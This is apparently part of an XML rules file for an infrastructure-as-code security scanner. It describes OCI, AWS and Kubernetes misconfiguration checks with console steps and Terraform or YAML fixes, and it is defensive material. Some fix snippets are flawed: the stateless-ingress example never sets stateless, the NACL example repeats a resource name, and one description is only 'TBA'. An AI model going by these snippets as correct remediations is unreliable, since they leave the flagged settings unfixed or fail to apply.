<p>Note : The console URL is region specific, your tenancy might have a different home region and thus console URL.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_identity_authentication_policy</li>
<li><strong>Arguments</strong>:  password_policy.is_special_characters_required</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_identity_authentication_policy" "pass" {

  compartment_id = var.tenancy_id

  password_policy {
    ...
    is_special_characters_required   = true
    ...
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-special-characters' target='_blank'> https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-special-characters</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-special-characters' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_14</key>
    <name>Ensure OCI IAM password policy contains uppercase characters</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-iam-password-policy-for-local-non-federated-users-does-not-have-an-uppercase-character"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-iam-password-policy-for-local-non-federated-users-does-not-have-an-uppercase-character"></div>OCI IAM password policy for local (non-federated) users does not have an uppercase character</div><a aria-label="Skip link to OCI IAM password policy for local (non-federated) users does not have an uppercase character" class="heading-anchor-icon fa fa-anchor" href="#oci-iam-password-policy-for-local-non-federated-users-does-not-have-an-uppercase-character"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Oracle Cloud Infrastructure(OCI) accounts that do not have an uppercase character in the password policy for local (non-federated) users. As a security best practice, configure a strong password policy for secure access to the OCI console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console Page:<a href="https://console.ap-mumbai-1.oraclecloud.com/" target="_self">https://console.ap-mumbai-1.oraclecloud.com/</a></li>
<li>Go to Identity in the Services menu.</li>
<li>Select Authentication Settings from the Identity menu.</li>
<li>Click Edit Authentication Settings in the middle of the page.</li>
<li>Ensure the checkbox is selected next to MUST CONTAIN AT LEAST 1 UPPERCASE CHARACTER.</li>
</ol>
<p>Note : The console URL is region specific, your tenancy might have a different home region and thus console URL.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_identity_authentication_policy</li>
<li><strong>Arguments</strong>: password_policy.is_uppercase_characters_required</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_identity_authentication_policy" "pass" {
...
  password_policy {
    ...
    is_uppercase_characters_required = true
    ...
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-uppercase-characters' target='_blank'> https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-uppercase-characters</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/oci-iam-password-policy-must-contain-uppercase-characters' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_15</key>
    <name>Ensure OCI File System is Encrypted with a customer Managed Key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-file-storage-file-systems-are-not-encrypted-with-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-file-storage-file-systems-are-not-encrypted-with-a-customer-managed-key-cmk"></div>OCI File Storage File Systems are not encrypted with a Customer Managed Key (CMK)</div><a aria-label="Skip link to OCI File Storage File Systems are not encrypted with a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#oci-file-storage-file-systems-are-not-encrypted-with-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI File Storage File Systems that are not encrypted with a Customer Managed Key (CMK). It is recommended that File Storage File Systems should be encrypted with a Customer Managed Key (CMK), using  Customer Managed Key (CMK), provides an additional level of security on your data by allowing you to manage your own encryption key lifecycle management for the File System</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Click Assign next to Encryption Key: Oracle managed key.</li>
<li>Select a Vault from the appropriate compartment</li>
<li>Select a Master Encryption Key</li>
<li>Click Assign</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_file_storage_file_system</li>
<li><strong>Arguments</strong>: kms_key_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_file_storage_file_system" "pass" {
  ...
  kms_key_id         = oci_kms_key.test_key.id
  ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-file-system-is-encrypted-with-a-customer-managed-key' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-file-system-is-encrypted-with-a-customer-managed-key</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-file-system-is-encrypted-with-a-customer-managed-key' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_16</key>
    <name>Ensure VCN has an inbound security list</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-vcn-has-no-inbound-security-list"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-vcn-has-no-inbound-security-list"></div>OCI VCN has no inbound security list</div><a aria-label="Skip link to OCI VCN has no inbound security list" class="heading-anchor-icon fa fa-anchor" href="#oci-vcn-has-no-inbound-security-list"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Virtual Cloud Networks (VCN) that lack ingress rules configured in their security lists. It is recommended that Virtual Cloud Networks (VCN) security lists are configured with ingress rules which provide stateful and stateless firewall capability to control network access to your instances.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Click on Ingress rules</li>
<li>Click on Add Ingress Rules (To add ingress rules appropriately in the pop up)</li>
<li>Click on Add Ingress Rules</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_core_security_list</li>
<li><strong>Arguments</strong>: vcn_id + ingress_security_rules</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_core_security_list" "pass" {
    compartment_id = oci_identity_compartment.tf-compartment.id
    vcn_id = oci_core_vcn.test_vcn.id
    ingress_security_rules {
        protocol = "all"
        source="192.168.1.0/24"
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-vcn-has-an-inbound-security-list' target='_blank'> https://docs.bridgecrew.io/docs/ensure-vcn-has-an-inbound-security-list</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-vcn-has-an-inbound-security-list' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_17</key>
    <name>Ensure VCN inbound security lists are stateless</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-vcn-security-list-has-stateful-security-rules"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-vcn-security-list-has-stateful-security-rules"></div>OCI VCN Security list has stateful security rules</div><a aria-label="Skip link to OCI VCN Security list has stateful security rules" class="heading-anchor-icon fa fa-anchor" href="#oci-vcn-security-list-has-stateful-security-rules"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Virtual Cloud Networks (VCN) security lists that have stateful ingress rules configured in their security lists. It is recommended that Virtual Cloud Networks (VCN) security lists are configured with stateless ingress rules to slow the impact of a denial-of-service (DoS) attack.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>Click on Ingress rule where Stateless column is set to No</li>
<li>Click on Edit</li>
<li>Select the checkbox STATELESS</li>
<li>Click on Save Changes</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_core_security_list</li>
<li><strong>Arguments</strong>: vcn_id + ingress_security_rule</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_core_security_list" "pass" {
    compartment_id = oci_identity_compartment.tf-compartment.id
    vcn_id = oci_core_vcn.test_vcn.id
    ingress_security_rules {
        protocol = "all"
        source="192.168.1.0/24"
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-vcn-inbound-security-lists-are-stateless' target='_blank'> https://docs.bridgecrew.io/docs/ensure-vcn-inbound-security-lists-are-stateless</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-vcn-inbound-security-lists-are-stateless' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_18</key>
    <name>Ensure OCI IAM password policy has a minimum length of 14 characters</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-iam-password-policy-for-local-non-federated-users-does-not-have-minimum-14-characters"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-iam-password-policy-for-local-non-federated-users-does-not-have-minimum-14-characters"></div>OCI IAM password policy for local (non-federated) users does not have minimum 14 characters</div><a aria-label="Skip link to OCI IAM password policy for local (non-federated) users does not have minimum 14 characters" class="heading-anchor-icon fa fa-anchor" href="#oci-iam-password-policy-for-local-non-federated-users-does-not-have-minimum-14-characters"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Oracle Cloud Infrastructure(OCI) accounts that do not have a minimum of 14 characters in the password policy for local (non-federated) users. As a security best practice, configure a strong password policy for secure access to the OCI console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console Page: <a href="https://console.ap-mumbai-1.oraclecloud.com/" target="_self">https://console.ap-mumbai-1.oraclecloud.com/</a></li>
<li>Go to Identity in the Services menu.</li>
<li>Select Authentication Settings from the Identity menu.</li>
<li>Click Edit Authentication Settings in the middle of the page.</li>
<li>Type the number in range 14-100 into the box below the text: MINIMUM PASSWORD LENGTH (IN CHARACTERS).</li>
</ol>
<p>Note : The console URL is region specific, your tenancy might have a different home region and thus console URL.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_identity_authentication_policy</li>
<li><strong>Arguments</strong>: password_policy.minimum_password_length </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_identity_authentication_policy" "pass" {

  compartment_id = var.tenancy_id

  password_policy {
...
    minimum_password_length          = 14
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/oci-iam-password-policy-for-local-non-federated-users-has-a-minimum-length-of-14-characters' target='_blank'> https://docs.bridgecrew.io/docs/oci-iam-password-policy-for-local-non-federated-users-has-a-minimum-length-of-14-characters</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/oci-iam-password-policy-for-local-non-federated-users-has-a-minimum-length-of-14-characters' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_1</key>
    <name>Ensure all NACL are attached to subnets</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="not-all-nacl-are-attached-to-subnets"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-not-all-nacl-are-attached-to-subnets"></div>Not all NACL are attached to subnets</div><a aria-label="Skip link to Not all NACL are attached to subnets" class="heading-anchor-icon fa fa-anchor" href="#not-all-nacl-are-attached-to-subnets"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_vpc,  aws_network_acl, aws_subne</li>
<li><strong>Argument:</strong> s<em>ubnet_ids</em> of  aws_network_acl</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_vpc" "ok_vpc" {
  cidr_block = "10.0.0.0/16"
}

resource "aws_subnet" "main" {
  vpc_id     = aws_vpc.ok_vpc.id
  cidr_block = "10.0.1.0/24"
}

resource "aws_subnet" "main" {
  cidr_block = "10.0.1.0/24"
}

resource "aws_network_acl" "acl_ok" {
  vpc_id = aws_vpc.ok_vpc.id
  subnet_ids = [aws_subnet.main.id]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-all-nacl-are-attached-to-subnets' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-all-nacl-are-attached-to-subnets</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-all-nacl-are-attached-to-subnets' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_21</key>
    <name>Ensure default namespace is not used</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="default-namespace-is-used"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-default-namespace-is-used"></div>Default namespace is used</div><a aria-label="Skip link to Default namespace is used" class="heading-anchor-icon fa fa-anchor" href="#default-namespace-is-used"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In Kubernetes, the cluster comes out of the box with a namespace called &#8220;default.&#8221; Other namespaces Kubernetes includes are: default, kube-system and kube-public. Some Kubernetes tooling is set up out of the box to use this namespace and you can&#8217;t delete it. </p>
<p>We recommend that you do not use the default namespace in large production systems. Using this space can result in accidental disruption with other services. Instead, we recommend you create alternate namespaces and use them to run additional required services.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Argument</strong>: namespace (Optional)<br/>
Defines the used namespace. Default to default.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="YAML">apiVersion: &lt;apiVersion&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
+ namespace: &lt;your namespace&gt;
- namespace: default
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_20' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_20</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_20' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_22</key>
    <name>Use Read-Only filesystem for containers where possible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="read-only-filesystem-for-containers-is-not-used"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-read-only-filesystem-for-containers-is-not-used"></div>Read-Only filesystem for containers is not used</div><a aria-label="Skip link to Read-Only filesystem for containers is not used" class="heading-anchor-icon fa fa-anchor" href="#read-only-filesystem-for-containers-is-not-used"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A read-only root filesystem helps to enforce an immutable infrastructure strategy. The container should only write on mounted volumes that can persist, even if the container exits.  </p>
<p>Using an immutable root filesystem and a verified boot mechanism prevents against attackers from "owning" the machine through permanent local changes. An immutable root filesystem can also prevent malicious binaries from writing to the host system.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: readOnlyRootFilesystem (Optional)<br/>
Defines whether a container is able to write into the root filesystem. Default to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    securityContext:
+      readOnlyRootFilesystem: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_21' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_21</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_21' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_23</key>
    <name>Minimize admission of root containers</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="admission-of-root-containers-not-minimized"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-admission-of-root-containers-not-minimized"></div>Admission of root containers not minimized</div><a aria-label="Skip link to Admission of root containers not minimized" class="heading-anchor-icon fa fa-anchor" href="#admission-of-root-containers-not-minimized"></a></h1>
